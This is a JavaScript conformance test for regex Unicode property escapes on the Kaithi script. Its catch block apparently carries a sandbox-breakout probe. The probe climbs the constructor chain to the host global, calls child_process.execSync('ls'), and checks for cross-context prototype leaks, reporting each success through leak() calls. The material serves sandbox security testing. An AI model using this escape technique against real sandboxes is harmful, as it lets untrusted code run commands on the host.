try {
    const matchSymbols = buildString({
        loneCodePoints: [69837],
        ranges: [[
                69760,
                69825
            ]]
    });
    testPropertyEscapes(/^\p{Script=Kaithi}+$/u, matchSymbols, '\\p{Script=Kaithi}');
    testPropertyEscapes(/^\p{Script=Kthi}+$/u, matchSymbols, '\\p{Script=Kthi}');
    testPropertyEscapes(/^\p{sc=Kaithi}+$/u, matchSymbols, '\\p{sc=Kaithi}');
    testPropertyEscapes(/^\p{sc=Kthi}+$/u, matchSymbols, '\\p{sc=Kthi}');
    const nonMatchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                56320,
                57343
            ],
            [
                0,
                56319
            ],
            [
                57344,
                69759
            ],
            [
                69826,
                69836
            ],
            [
                69838,
                1114111
            ]
        ]
    });
    testPropertyEscapes(/^\P{Script=Kaithi}+$/u, nonMatchSymbols, '\\P{Script=Kaithi}');
    testPropertyEscapes(/^\P{Script=Kthi}+$/u, nonMatchSymbols, '\\P{Script=Kthi}');
    testPropertyEscapes(/^\P{sc=Kaithi}+$/u, nonMatchSymbols, '\\P{sc=Kaithi}');
    testPropertyEscapes(/^\P{sc=Kthi}+$/u, nonMatchSymbols, '\\P{sc=Kthi}');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}